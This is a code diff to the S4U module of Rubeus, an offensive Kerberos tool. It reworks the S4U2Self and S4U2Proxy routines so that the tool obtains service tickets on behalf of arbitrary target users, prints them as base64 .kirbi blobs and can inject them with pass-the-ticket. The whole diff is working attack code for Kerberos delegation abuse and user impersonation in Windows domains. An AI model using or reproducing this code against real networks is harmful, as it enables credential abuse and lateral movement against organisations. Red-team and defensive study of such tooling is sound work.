@@ -7,7 +7,7 @@ namespace Rubeus
 {
     public class S4U
     {
-        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", KRB_CRED tgs = null)
+        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null)
         {
             // first retrieve a TGT for the user
             byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, false, domainController);
@@ -28,18 +28,22 @@ namespace Rubeus
             // execute the s4u process
             Execute(kirbi, targetUser, targetSPN, ptt, domainController, altService, tgs);
         }
-        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", KRB_CRED tgs = null)
+        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null)
         {
             Console.WriteLine("[*] Action: S4U\r\n");
 
-            if (tgs != null)
+            if (tgs != null && String.IsNullOrEmpty(targetSPN) == false)
             {
-                Console.WriteLine("[*] Loaded TGS for '{0}\\{1}' to '{2}/{3}'", tgs.enc_part.ticket_info[0].prealm, tgs.enc_part.ticket_info[0].pname.name_string[0], tgs.enc_part.ticket_info[0].sname.name_string[0], tgs.tickets[0].sname.name_string[1]);
+                Console.WriteLine("[*] Loaded a TGS for {0}\\{1}", tgs.enc_part.ticket_info[0].prealm, tgs.enc_part.ticket_info[0].pname.name_string[0]);
                 S4U2Proxy(kirbi, targetUser, targetSPN, ptt, domainController, altService, tgs.tickets[0]);
             }
             else
             {
-                S4U2Self(kirbi, targetUser, targetSPN, ptt, domainController, altService);
+                Ticket self = S4U2Self(kirbi, targetUser, targetSPN, ptt, domainController, altService);
+                if (String.IsNullOrEmpty(targetSPN) == false)
+                {
+                    S4U2Proxy(kirbi, targetUser, targetSPN, ptt, domainController, altService, self);
+                }
             }
         }
         private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", Ticket tgs = null)
@@ -280,7 +284,7 @@ namespace Rubeus
                 Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
             }
         }
-        private static void S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "")
+        private static Ticket S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "")
         {
             // extract out the info needed for the TGS-REQ/S4U2Self execution
             string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
@@ -290,7 +294,7 @@ namespace Rubeus
             Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;
 
             string dcIP = Networking.GetDCIP(domainController);
-            if (String.IsNullOrEmpty(dcIP)) { return; }
+            if (String.IsNullOrEmpty(dcIP)) { return null; }
 
             Console.WriteLine("[*] Building S4U2self request for: '{0}\\{1}'", domain, userName);
 
@@ -300,7 +304,7 @@ namespace Rubeus
             byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
             if (response == null)
             {
-                return;
+                return null;
             }
 
             // decode the supplied bytes to an AsnElt object
@@ -316,15 +320,71 @@ namespace Rubeus
 
                 // parse the response to an TGS-REP
                 TGS_REP rep = new TGS_REP(responseAsn);
-
-                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62
-                byte[] outBytes = Crypto.KerberosDecrypt(etype, 8, clientKey, rep.enc_part.cipher);
+                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
+                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                 AsnElt ae = AsnElt.Decode(outBytes, false);
                 EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
 
-                // TODO: ensure the cname contains the name of the user! otherwise s4u not supported
+                // now build the final KRB-CRED structure
+                KRB_CRED cred = new KRB_CRED();
 
-                S4U2Proxy(kirbi, targetUser, targetSPN, ptt, domainController, altService, rep.ticket);
+                // add the ticket
+                cred.tickets.Add(rep.ticket);
+
+                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
+
+                KrbCredInfo info = new KrbCredInfo();
+
+                // [0] add in the session key
+                info.key.keytype = encRepPart.key.keytype;
+                info.key.keyvalue = encRepPart.key.keyvalue;
+
+                // [1] prealm (domain)
+                info.prealm = encRepPart.realm;
+
+                // [2] pname (user)
+                info.pname.name_type = rep.cname.name_type;
+                info.pname.name_string = rep.cname.name_string;
+
+                // [3] flags
+                info.flags = encRepPart.flags;
+
+                // [4] authtime (not required)
+
+                // [5] starttime
+                info.starttime = encRepPart.starttime;
+
+                // [6] endtime
+                info.endtime = encRepPart.endtime;
+
+                // [7] renew-till
+                info.renew_till = encRepPart.renew_till;
+
+                // [8] srealm
+                info.srealm = encRepPart.realm;
+
+                // [9] sname
+                info.sname.name_type = encRepPart.sname.name_type;
+                info.sname.name_string = encRepPart.sname.name_string;
+
+                // add the ticket_info into the cred object
+                cred.enc_part.ticket_info.Add(info);
+
+                byte[] kirbiBytes = cred.Encode().Encode();
+
+                string kirbiString = Convert.ToBase64String(kirbiBytes);
+
+                Console.WriteLine("[*] Got a TGS for '{0}' to '{1}\\{2}'", info.pname.name_string[0], info.srealm, info.sname.name_string[0]);
+                Console.WriteLine("[*] base64(ticket.kirbi):\r\n");
+
+                // display the .kirbi base64, columns of 80 chararacters
+                foreach (string line in Helpers.Split(kirbiString, 80))
+                {
+                    Console.WriteLine("      {0}", line);
+                }
+                Console.WriteLine("");
+
+                return rep.ticket;
             }
             else if (responseTag == 30)
             {
@@ -336,6 +396,8 @@ namespace Rubeus
             {
                 Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
             }
+
+            return null;
         }
     }
 }
